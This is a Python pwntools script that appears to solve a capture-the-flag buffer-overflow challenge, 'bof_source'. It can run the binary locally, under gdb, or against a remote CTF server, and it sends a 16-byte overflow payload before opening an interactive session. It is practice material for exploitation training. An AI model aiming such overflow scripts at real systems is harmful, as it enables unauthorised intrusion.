#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./bof_source"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("uectf.uec.tokyo", 30002)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
        b *main+59
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


payload = b"A" * 15
payload += b'1'

p.recvuntil("")
sleep(0.5)
p.sendline(payload)

p.interactive()
